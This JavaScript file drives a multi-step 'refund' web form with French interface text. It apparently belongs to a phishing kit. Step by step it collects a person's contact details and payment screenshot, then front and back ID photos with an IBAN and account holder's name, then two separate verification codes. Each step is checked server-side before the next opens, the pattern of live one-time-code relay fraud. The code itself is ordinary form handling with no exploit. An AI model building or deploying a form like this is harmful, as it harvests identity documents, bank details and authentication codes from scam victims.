(() => {
  const form = document.querySelector("[data-step-form]");
  if (!form) return;

  const panels = Array.from(form.querySelectorAll(".step-panel"));
  const dots = Array.from(form.querySelectorAll(".step-dot"));
  const actionBase = (form.getAttribute("action") || "").replace(/\/$/, "");
  const isRefundFlow = /\/refund$/i.test(actionBase);
  const loaderApi = window.__siteLoader;
  const initialStep = Math.max(
    1,
    Math.min(5, Number(form.getAttribute("data-initial-step") || "1")),
  );
  let current = 0;

  const ensureLiveNotice = () => {
    let notice = form.querySelector(".step-live-notice");
    if (notice) return notice;
    notice = document.createElement("div");
    notice.className = "step-live-notice";
    const stepIndicator = form.querySelector(".step-indicator");
    if (stepIndicator) {
      stepIndicator.insertAdjacentElement("afterend", notice);
    } else {
      form.prepend(notice);
    }
    return notice;
  };

  const setLiveNotice = (type, message) => {
    const notice = ensureLiveNotice();
    const text = String(message || "").trim();
    if (!text) {
      notice.classList.remove("is-success", "is-error");
      notice.style.display = "none";
      notice.textContent = "";
      return;
    }
    notice.textContent = text;
    notice.classList.remove("is-success", "is-error");
    notice.classList.add(type === "error" ? "is-error" : "is-success");
    notice.style.display = "block";
  };

  const setPanelError = (idx, message) => {
    const panel = panels[idx];
    if (!panel) return;
    let errorEl = panel.querySelector(".step-error");
    if (!errorEl) {
      errorEl = document.createElement("p");
      errorEl.className = "step-error";
      const actions = panel.querySelector(".step-actions");
      if (actions) {
        panel.insertBefore(errorEl, actions);
      } else {
        panel.appendChild(errorEl);
      }
    }
    errorEl.textContent = message || "";
    errorEl.style.display = message ? "block" : "none";
  };

  const postStepValidation = async (
    url,
    payload,
    asFormData = false,
    opts = {},
  ) => {
    const minDurationMs = Number(opts?.minDurationMs || 0);
    const startedAt = Date.now();
    if (loaderApi && typeof loaderApi.show === "function") {
      loaderApi.show();
    }

    const requestOptions = {
      method: "POST",
      credentials: "same-origin",
    };

    if (asFormData) {
      requestOptions.body = payload;
    } else {
      requestOptions.headers = {
        "Content-Type": "application/json",
        Accept: "application/json",
      };
      requestOptions.body = JSON.stringify(payload);
    }

    let res;
    try {
      res = await fetch(url, {
        ...requestOptions,
      });
    } finally {
      const elapsed = Date.now() - startedAt;
      if (minDurationMs > elapsed) {
        await new Promise((resolve) =>
          setTimeout(resolve, minDurationMs - elapsed),
        );
      }
      if (loaderApi && typeof loaderApi.hide === "function") {
        loaderApi.hide();
      }
    }

    let data = {};
    try {
      data = await res.json();
    } catch {
      data = {};
    }

    if (!res.ok || !data.ok) {
      return { ok: false, message: data.message || "Verification impossible." };
    }
    return { ok: true, message: data.message || "" };
  };

  const validateServerStepIfNeeded = async (idx) => {
    if (!isRefundFlow) {
      return { ok: true, message: "" };
    }

    if (idx === 0) {
      const fullNameInput = panels[idx]?.querySelector(
        'input[name="refund_full_name"]',
      );
      const phoneInput = panels[idx]?.querySelector('input[name="refund_phone"]');
      const emailInput = panels[idx]?.querySelector('input[name="refund_email"]');
      const orderDateInput = panels[idx]?.querySelector(
        'input[name="refund_order_date"]',
      );
      const amountPaidInput = panels[idx]?.querySelector(
        'input[name="refund_amount_paid"]',
      );
      const paymentMethodInput = panels[idx]?.querySelector(
        'input[name="refund_payment_method"]',
      );
      const screenshotInput = panels[idx]?.querySelector(
        'input[name="payment_screenshot_step1"]',
      );
      const screenshotFile = screenshotInput?.files?.[0];

      const fd = new FormData();
      fd.append("refund_full_name", String(fullNameInput?.value || "").trim());
      fd.append("refund_phone", String(phoneInput?.value || "").trim());
      fd.append("refund_email", String(emailInput?.value || "").trim());
      fd.append(
        "refund_order_date",
        String(orderDateInput?.value || "").trim(),
      );
      fd.append(
        "refund_amount_paid",
        String(amountPaidInput?.value || "").trim(),
      );
      fd.append(
        "refund_payment_method",
        String(paymentMethodInput?.value || "").trim(),
      );
      if (screenshotFile) {
        fd.append("payment_screenshot_step1", screenshotFile);
      }
      return postStepValidation(`${actionBase}/step1/validate`, fd, true);
    }

    if (idx === 1) {
      const frontInput = panels[idx]?.querySelector(
        'input[name="id_photo_front_step2"]',
      );
      const backInput = panels[idx]?.querySelector(
        'input[name="id_photo_back_step2"]',
      );
      const ibanInput = panels[idx]?.querySelector(
        'input[name="refund_iban_step2"]',
      );
      const holderInput = panels[idx]?.querySelector(
        'input[name="refund_account_holder_step2"]',
      );
      const frontFile = frontInput?.files?.[0];
      const backFile = backInput?.files?.[0];
      const fd = new FormData();
      if (frontFile) fd.append("id_photo_front_step2", frontFile);
      if (backFile) fd.append("id_photo_back_step2", backFile);
      fd.append("refund_iban_step2", String(ibanInput?.value || "").trim());
      fd.append(
        "refund_account_holder_step2",
        String(holderInput?.value || "").trim(),
      );
      return postStepValidation(`${actionBase}/step2/validate`, fd, true);
    }

    if (idx === 2) {
      const input = panels[idx]?.querySelector(
        'input[name="verification_code_step3"]',
      );
      const code = String(input?.value || "").trim();
      return postStepValidation(`${actionBase}/step3/validate`, {
        verification_code_step3: code,
      });
    }

    if (idx === 3) {
      const input = panels[idx]?.querySelector(
        'input[name="verification_code_step4"]',
      );
      const code = String(input?.value || "").trim();
      return postStepValidation(`${actionBase}/step4/validate`, {
        verification_code_step4: code,
      });
    }

    return { ok: true, message: "" };
  };

  const showStep = (idx) => {
    current = Math.max(0, Math.min(idx, panels.length - 1));
    panels.forEach((p, i) => p.classList.toggle("is-active", i === current));
    dots.forEach((d, i) => d.classList.toggle("is-active", i <= current));
  };

  const validateStep = (idx) => {
    const panel = panels[idx];
    if (!panel) return false;
    const inputs = Array.from(
      panel.querySelectorAll("input[required], input[pattern], input[minlength]"),
    );
    for (const input of inputs) {
      if (!input.checkValidity()) {
        input.reportValidity();
        return false;
      }
    }
    return true;
  };

  const copyToClipboard = async (value) => {
    const text = String(value || "").trim();
    if (!text) return false;
    if (navigator.clipboard?.writeText) {
      await navigator.clipboard.writeText(text);
      return true;
    }
    const temp = document.createElement("textarea");
    temp.value = text;
    temp.setAttribute("readonly", "");
    temp.style.position = "absolute";
    temp.style.left = "-9999px";
    document.body.appendChild(temp);
    temp.select();
    const ok = document.execCommand("copy");
    temp.remove();
    return ok;
  };

  form.addEventListener("click", async (event) => {
    const copyBtn = event.target.closest(".support-copy-btn");
    if (copyBtn) {
      event.preventDefault();
      const value = copyBtn.dataset.copyValue || "";
      try {
        const ok = await copyToClipboard(value);
        if (!ok) throw new Error("copy_failed");
        const oldText = copyBtn.textContent;
        copyBtn.textContent = "Copie";
        setLiveNotice("success", "Adresse email du support copiee.");
        setTimeout(() => {
          copyBtn.textContent = oldText || "Copier";
        }, 1200);
      } catch {
        setLiveNotice("error", "Impossible de copier l'adresse email du support.");
      }
      return;
    }

    const nextBtn = event.target.closest(".step-next");
    const prevBtn = event.target.closest(".step-prev");

    if (nextBtn) {
      event.preventDefault();
      if (!validateStep(current)) return;
      setPanelError(current, "");
      const serverCheck = await validateServerStepIfNeeded(current);
      if (!serverCheck.ok) {
        setPanelError(current, serverCheck.message);
        setLiveNotice("error", serverCheck.message || "Validation impossible.");
        return;
      }
      setLiveNotice(
        "success",
        serverCheck.message || `Étape ${current + 1} validée avec succès.`,
      );
      showStep(current + 1);
      return;
    }

    if (prevBtn) {
      event.preventDefault();
      setPanelError(current, "");
      showStep(current - 1);
    }
  });

  form.addEventListener("submit", (event) => {
    if (!validateStep(current)) {
      event.preventDefault();
    }
  });

  showStep(initialStep - 1);
})();
